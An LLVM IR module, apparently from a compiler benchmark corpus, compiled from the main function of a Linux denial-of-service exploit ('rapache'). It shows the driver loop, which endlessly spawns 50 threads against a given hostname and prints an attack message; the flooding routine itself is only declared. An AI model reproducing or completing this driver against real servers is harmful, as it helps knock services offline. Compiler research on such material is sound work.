; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_18221.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_18221.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.thread_info = type { i32, i8*, i32 }

@.str = private unnamed_addr constant [33 x i8] c"\0A[-] Usage : ./rapache hostname\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [46 x i8] c"[+] Attacking %s please wait  in minutes ...\0A\00", align 1
@thread_start = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.thread_info, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = call i32 (...) @banner()
  %9 = load i32, i32* %4, align 4
  %10 = icmp sle i32 %9, 1
  br i1 %10, label %11, label %15

11:                                               ; preds = %2
  %12 = call i32 @w4rn41dun14mu(i32 0, i32 2, i32 0)
  %13 = load i32, i32* @stdout, align 4
  %14 = call i32 @fwrite(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0), i32 32, i32 1, i32 %13)
  ret i32 0

15:                                               ; preds = %2
  %16 = call i32 @w4rn41dun14mu(i32 0, i32 3, i32 0)
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 1
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0), i8* %19)
  br label %21

21:                                               ; preds = %15, %37
  store i32 0, i32* %6, align 4
  br label %22

22:                                               ; preds = %25, %21
  %23 = load i32, i32* %6, align 4
  %24 = icmp ne i32 %23, 50
  br i1 %24, label %25, label %37

25:                                               ; preds = %22
  %26 = load i32, i32* %6, align 4
  %27 = getelementptr inbounds %struct.thread_info, %struct.thread_info* %7, i32 0, i32 0
  store i32 %26, i32* %27, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = getelementptr inbounds %struct.thread_info, %struct.thread_info* %7, i32 0, i32 1
  store i8* %30, i8** %31, align 8
  %32 = getelementptr inbounds %struct.thread_info, %struct.thread_info* %7, i32 0, i32 2
  %33 = call i32 @pthread_create(i32* %32, i32* null, i32* @thread_start, %struct.thread_info* %7)
  %34 = call i32 @usleep(i32 500000)
  %35 = load i32, i32* %6, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %6, align 4
  br label %22

37:                                               ; preds = %22
  br label %21
}

declare dso_local i32 @banner(...) #1

declare dso_local i32 @w4rn41dun14mu(i32, i32, i32) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32*, %struct.thread_info*) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
